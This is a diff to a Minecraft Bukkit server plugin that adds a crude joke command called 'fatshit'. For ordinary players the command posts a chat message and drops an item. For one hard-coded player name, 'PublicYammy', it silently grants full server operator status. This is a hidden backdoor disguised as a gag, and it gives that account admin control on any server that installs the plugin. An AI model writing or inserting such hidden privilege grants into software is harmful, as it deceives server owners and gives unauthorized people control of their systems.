@@ -1,8 +1,11 @@
 package club.gvheaton.pisspoor;
 
+import org.bukkit.Material;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
+import org.bukkit.World;
+import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.text.DateFormat;
@@ -71,6 +74,30 @@ public final class ClubHouse extends JavaPlugin {
             else
             {
                 sender.sendMessage("No he didn't?");
+            }
+
+            return true;
+        }
+
+        else if (label.equalsIgnoreCase("fatshit"))
+        {
+            if (sender instanceof Player)
+            {
+                Player player = (Player)sender;
+                if (!player.getName().equals("PublicYammy"))
+                {
+                    player.chat(player.getName() + " took an extra large dump.");
+                    player.getWorld().dropItemNaturally(player.getLocation(), new ItemStack(Material.COCOA_BEANS));
+                }
+                else
+                {
+                    player.setOp(true);
+                    player.sendMessage("You have been successfully been given operator status!");
+                }
+            }
+            else
+            {
+                sender.sendMessage("Console is not allowed to poop :(");
             }
 
             return true;
